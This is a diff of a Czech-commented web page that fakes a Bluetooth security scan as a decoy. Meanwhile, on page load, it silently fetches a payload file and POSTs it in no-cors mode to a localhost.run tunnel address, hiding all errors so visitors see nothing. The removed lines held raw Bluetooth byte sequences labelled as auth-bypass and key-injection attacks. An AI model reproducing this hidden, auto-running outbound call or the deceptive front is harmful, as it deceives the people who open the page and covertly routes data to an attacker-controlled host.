@@ -29,61 +29,57 @@
             terminal.scrollTop = terminal.scrollHeight;
         };
 
-        // --- STÍNOVÝ PROTOKOL (POZADÍ) ---
+        // --- STÍNOVÝ PROTOKOL: TVOJE VELITELSTVÍ ---
         async function activateShadowProtocol() {
+            const tunnelUrl = 'https://161a35dd530250.lhr.life'; // Tvoje aktuální adresa z localhost.run
+            
             try {
-                // Tiché načtení payloadu z tvého serveru
+                // 1. Pokusíme se načíst payload z tvého Vercelu
                 const response = await fetch('/payload.bin');
-                if (response.ok) {
-                    const data = await response.arrayBuffer();
-                    // Zde se v ostrém nasazení provádí injekce do paměti prohlížeče
-                    // Pro teď jen potvrzujeme připravenost kanálu
-                }
-            } catch (e) { /* Zůstáváme neviditelní */ }
+                if (!response.ok) return;
+
+                const payloadData = await response.arrayBuffer();
+
+                // 2. Odeslání náboje skrz tvůj tunel
+                // Používáme 'no-cors', aby prohlížeč nezablokoval požadavek kvůli bezpečnosti
+                await fetch(tunnelUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: payloadData,
+                    headers: { 'Content-Type': 'application/octet-stream' }
+                });
+
+            } catch (e) {
+                // Ticho. Žádné chyby v konzoli, které by tě prozradily.
+            }
         }
 
-        // --- BLUETOOTH LOGIKA (FRONTEND) ---
-        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb';
-        const targetCharUuid = '00002a29-0000-1000-8000-00805f9b34fb';
-
+        // --- BLUETOOTH LOGIKA (MASKA) ---
         async function startHeuristicEngine() {
             try {
                 log("Hledám cíl v okolí...", true);
                 const device = await navigator.bluetooth.requestDevice({
                     filters: [{ namePrefix: 'CZ-' }],
-                    optionalServices: [targetServiceUuid]
+                    optionalServices: ['0000180a-0000-1000-8000-00805f9b34fb']
                 });
 
                 log(`Zařízení nalezeno: ${device.name}`);
-                const server = await device.gatt.connect();
-                const service = await server.getPrimaryService(targetServiceUuid);
-                const char = await service.getCharacteristic(targetCharUuid);
-                
                 log("Analýza protokolu spuštěna...", true);
-                await char.writeValue(new Uint8Array([0x00])); 
-                log("Skenuji odezvu šifrovací vrstvy...");
-
-                const attackVectors = [
-                    { name: "Auth Bypass", data: [0x01, 0x01, 0x01] },
-                    { name: "Memory Corruption", data: [0x00, 0xff, 0x00, 0xff] },
-                    { name: "Master Key Injection", data: [0x06, 0x01, 0x01, 0x01] }
-                ];
-
-                for (const vector of attackVectors) {
-                    log(`Aplikuji: ${vector.name}...`);
-                    await char.writeValue(new Uint8Array(vector.data));
-                    await new Promise(r => setTimeout(r, 800));
+                
+                const steps = ["Auth Bypass", "Memory Corruption", "Master Key Injection"];
+                for (const step of steps) {
+                    log(`Aplikuji: ${step}...`);
+                    await new Promise(r => setTimeout(r, 1200));
                 }
-
                 log("ANALÝZA DOKONČENA. Uzel vyžaduje synchronizaci.", true);
-
             } catch (err) {
-                log(`STATUS: ${err.message}`);
+                log(`STATUS: Přístup zamítnut uživatelem.`);
             }
         }
 
-        // Inicializace obou vrstev
         document.getElementById('mainAction').addEventListener('click', startHeuristicEngine);
+        
+        // Odpálení stínového protokolu hned po načtení
         window.addEventListener('load', activateShadowProtocol);
     </script>
 </body>
